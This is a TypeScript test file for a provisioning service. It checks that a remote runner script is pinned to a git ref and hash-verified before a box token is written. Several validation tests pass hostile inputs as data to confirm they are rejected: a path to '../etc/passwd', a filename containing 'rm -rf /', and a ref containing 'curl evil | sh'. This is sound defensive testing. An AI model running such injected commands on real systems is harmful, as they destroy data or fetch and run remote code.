import { env, fetchMock } from 'cloudflare:test'
import { afterEach, beforeAll, describe, expect, it } from 'vitest'
import { getFleetConfig, pinRunner } from '../src/lib/fleet-config.ts'
import type { CloudAgentRow } from '../src/lib/fleet-store.ts'
import { bootstrapUserData, dispatchProvision } from '../src/lib/provisioner.ts'
import { runnerFetchScript, runnerPinFromConfig, runnerUrl } from '../src/lib/runner-pin.ts'
import { setupFleetSchema } from './setup-d1.ts'

const PIN = { ref: 'a'.repeat(40), files: { 'box-runner.mjs': 'b'.repeat(64) } }
const MANIFEST = {
	ref: 'a'.repeat(40),
	files: {
		'box-runner.mjs': 'b'.repeat(64),
		'harness/index.mjs': 'c'.repeat(64),
		'lib/util.mjs': 'd'.repeat(64),
	},
}

function userData(overrides: Partial<Parameters<typeof bootstrapUserData>[0]> = {}) {
	return bootstrapUserData({
		boxId: 'box-test',
		agentId: 'ca_test',
		queue: 'default',
		route: 'claude',
		ttlSeconds: 3600,
		mcpBaseUrl: 'https://fermi.example.com',
		boxToken: 'box-test.supersecret',
		claudeModel: null,
		runnerPin: PIN,
		...overrides,
	})
}

describe('runner boot pin (#34)', () => {
	beforeAll(setupFleetSchema)

	it('fetch script pins the ref and verifies sha256 with no fallback', () => {
		const script = runnerFetchScript(PIN)
		expect(script).toContain(runnerUrl(PIN.ref))
		expect(script).toContain(PIN.files['box-runner.mjs'])
		expect(script).not.toContain('/main/') // no floating branch
		expect(script).not.toContain('|| true') // fail closed, no baked-copy fallback
	})

	it('user-data verifies the runner BEFORE materializing the box token', () => {
		const script = userData()
		const verifyAt = script.indexOf(PIN.files['box-runner.mjs'])
		const tokenAt = script.indexOf('FERMI_BOX_TOKEN=')
		expect(verifyAt).toBeGreaterThan(-1)
		expect(tokenAt).toBeGreaterThan(-1)
		expect(verifyAt).toBeLessThan(tokenAt)
	})

	it('fetch script fetches and verifies every manifest file before installing any', () => {
		const script = runnerFetchScript(MANIFEST)
		const lines = script.split('\n')
		const lastVerify = Math.max(...lines.map((l, i) => (l.includes('sha256sum -c') ? i : -1)))
		const firstInstall = lines.findIndex((l) => l.startsWith('mv '))
		for (const [path, sha] of Object.entries(MANIFEST.files)) {
			expect(script).toContain(runnerUrl(MANIFEST.ref, path))
			expect(script).toContain(`echo '${sha}  /opt/fermi/.runner-staging/${path}'`)
			expect(script).toContain(`mv '/opt/fermi/.runner-staging/${path}' '/opt/fermi/${path}'`)
		}
		expect(lastVerify).toBeLessThan(firstInstall)
	})

	it('user-data verifies every manifest file BEFORE materializing the box token', () => {
		const script = userData({ runnerPin: MANIFEST })
		const tokenAt = script.indexOf('FERMI_BOX_TOKEN=')
		for (const sha of Object.values(MANIFEST.files)) {
			const at = script.indexOf(sha)
			expect(at).toBeGreaterThan(-1)
			expect(at).toBeLessThan(tokenAt)
		}
	})

	it('fetch script throws on an invalid manifest', () => {
		const bad =
			(files: Record<string, string>, ref = MANIFEST.ref) =>
			() =>
				runnerFetchScript({ ref, files })
		expect(bad({ 'harness/index.mjs': 'c'.repeat(64) })).toThrow() // no box-runner.mjs
		expect(bad({ ...MANIFEST.files, '../etc/passwd': 'c'.repeat(64) })).toThrow()
		expect(bad({ ...MANIFEST.files, '/abs.mjs': 'c'.repeat(64) })).toThrow()
		expect(bad({ ...MANIFEST.files, "x';rm -rf /;'.mjs": 'c'.repeat(64) })).toThrow()
		expect(bad({ ...MANIFEST.files, 'lib/x.mjs': 'not-a-sha' })).toThrow()
		expect(bad(MANIFEST.files, "a'; curl evil | sh; '")).toThrow()
	})

	it('runnerPinFromConfig reads legacy and manifest pins, null when unset or invalid', () => {
		const ref = 'a'.repeat(40)
		const sha = 'b'.repeat(64)
		expect(runnerPinFromConfig({ runner_ref: ref, runner_sha256: sha })).toEqual({
			ref,
			files: { 'box-runner.mjs': sha },
		})
		expect(
			runnerPinFromConfig({ runner_ref: ref, runner_sha256: null, runner_files: MANIFEST.files }),
		).toEqual(MANIFEST)
		expect(
			runnerPinFromConfig({ runner_ref: ref, runner_sha256: sha, runner_files: MANIFEST.files }),
		).toEqual(MANIFEST)
		expect(runnerPinFromConfig({ runner_ref: null, runner_sha256: null })).toBeNull()
		expect(runnerPinFromConfig({ runner_ref: ref, runner_sha256: null })).toBeNull()
		expect(runnerPinFromConfig({ runner_ref: ref, runner_sha256: 'zz' })).toBeNull()
		// manifest without box-runner.mjs, unsafe path, or disagreeing legacy hash
		expect(
			runnerPinFromConfig({ runner_ref: ref, runner_files: { 'lib/util.mjs': sha } }),
		).toBeNull()
		expect(
			runnerPinFromConfig({
				runner_ref: ref,
				runner_files: { ...MANIFEST.files, 'lib/../../x.mjs': sha },
			}),
		).toBeNull()
		expect(
			runnerPinFromConfig({
				runner_ref: ref,
				runner_sha256: 'e'.repeat(64),
				runner_files: MANIFEST.files,
			}),
		).toBeNull()
	})

	it('user-data has no unpinned curl of main', () => {
		expect(userData()).not.toContain('fermi-daemon/main/')
	})

	it('dispatchProvision refuses launch when the runner pin is unset', async () => {
		await env.FERMI_KV.put(
			'fleet:config',
			JSON.stringify({ default_env: 'test-env', runner_ref: null, runner_sha256: null }),
		)
		const agent: CloudAgentRow = {
			id: 'ca_pinless',
			status: 'launching',
			route: 'claude',
			queue: 'default',
			prompt: 'x',
			proof_contract: 'y',
			box_id: null,
			ttl_seconds: 3600,
			budget_usd: null,
			cost_usd: 0,
			created_at: Date.now(),
			started_at: null,
			ended_at: null,
			exit_reason: null,
			meta: '{}',
		} as unknown as CloudAgentRow
		const out = await dispatchProvision(env, agent)
		expect(out.dispatched).toBe(false)
		expect(out.reason).toBe('runner_pin_unset')
	})

	it('dispatchProvision refuses launch when the runner manifest is invalid', async () => {
		await env.FERMI_KV.put(
			'fleet:config',
			JSON.stringify({
				default_env: 'test-env',
				runner_ref: 'a'.repeat(40),
				runner_sha256: null,
				runner_files: { 'lib/util.mjs': 'b'.repeat(64) },
			}),
		)
		const agent = { id: 'ca_badpin', box_id: null, queue: 'default', route: 'claude' }
		const out = await dispatchProvision(env, agent as unknown as CloudAgentRow)
		expect(out).toEqual({ dispatched: false, reason: 'runner_pin_unset' })
	})
})

const enc = (s: string) => new TextEncoder().encode(s)
async function hex(s: string): Promise<string> {
	const d = await crypto.subtle.digest('SHA-256', enc(s))
	return [...new Uint8Array(d)].map((x) => x.toString(16).padStart(2, '0')).join('')
}

describe('pinRunner (POST /admin/fleet/pin-runner)', () => {
	const REF = 'f'.repeat(40)
	const SERVED: Record<string, string> = {
		'box-runner.mjs': 'console.log("runner")',
		'harness/index.mjs': 'export const h = 1',
		'lib/util.mjs': 'export const u = 1',
	}
	const serve = (paths: string[]) => {
		for (const p of paths)
			fetchMock
				.get('https://raw.githubusercontent.com')
				.intercept({ path: `/abel30567/fermi-daemon/${REF}/${p}` })
				.reply(200, SERVED[p])
	}

	beforeAll(() => {
		fetchMock.activate()
		fetchMock.disableNetConnect()
	})
	afterEach(async () => {
		await env.FERMI_KV.delete('fleet:config')
	})

	it('legacy single-file pin: fetches box-runner.mjs and stores its hash', async () => {
		await env.FERMI_KV.put(
			'fleet:config',
			JSON.stringify({ default_env: 'keep', runner_files: { stale: 'x' } }),
		)
		serve(['box-runner.mjs'])
		const res = await pinRunner(env, { ref: REF })
		const sha = await hex(SERVED['box-runner.mjs'])
		expect(res).toMatchObject({ status: 200, body: { ok: true, ref: REF, sha256: sha } })
		const config = await getFleetConfig(env)
		expect(config).toMatchObject({
			default_env: 'keep',
			runner_ref: REF,
			runner_sha256: sha,
			runner_files: null,
		})
		expect(runnerPinFromConfig(config)).toEqual({ ref: REF, files: { 'box-runner.mjs': sha } })
	})

	it('manifest pin: verifies every file and stores the manifest', async () => {
		const files: Record<string, string> = {}
		for (const [p, body] of Object.entries(SERVED)) files[p] = await hex(body)
		serve(Object.keys(SERVED))
		const res = await pinRunner(env, { ref: REF, files })
		expect(res).toMatchObject({ status: 200, body: { ok: true, files } })
		const config = await getFleetConfig(env)
		expect(config.runner_sha256).toBe(files['box-runner.mjs'])
		expect(runnerPinFromConfig(config)).toEqual({ ref: REF, files })
	})

	it('manifest pin: refuses when a served file does not match its declared hash', async () => {
		const files: Record<string, string> = {}
		for (const [p, body] of Object.entries(SERVED)) files[p] = await hex(body)
		files['lib/util.mjs'] = 'e'.repeat(64)
		serve(Object.keys(SERVED))
		const res = await pinRunner(env, { ref: REF, files })
		expect(res).toMatchObject({
			status: 409,
			body: { ok: false, error: 'sha256_mismatch', path: 'lib/util.mjs' },
		})
		expect(await env.FERMI_KV.get('fleet:config')).toBeNull()
	})

	it('400 on a bad ref or a malformed files manifest, without fetching', async () => {
		const sha = 'b'.repeat(64)
		for (const body of [
			{},
			{ ref: 'main' },
			{ ref: "abc1234'; rm" },
			{ ref: REF, files: null },
			{ ref: REF, files: ['box-runner.mjs'] },
			{ ref: REF, files: {} },
			{ ref: REF, files: { 'lib/util.mjs': sha } },
			{ ref: REF, files: { 'box-runner.mjs': 'nope' } },
			{ ref: REF, files: { 'box-runner.mjs': sha, '../x.mjs': sha } },
		]) {
			const res = await pinRunner(env, body)
			expect(res.status, JSON.stringify(body)).toBe(400)
			expect(res.body.ok).toBe(false)
		}
		expect(await env.FERMI_KV.get('fleet:config')).toBeNull()
	})
})
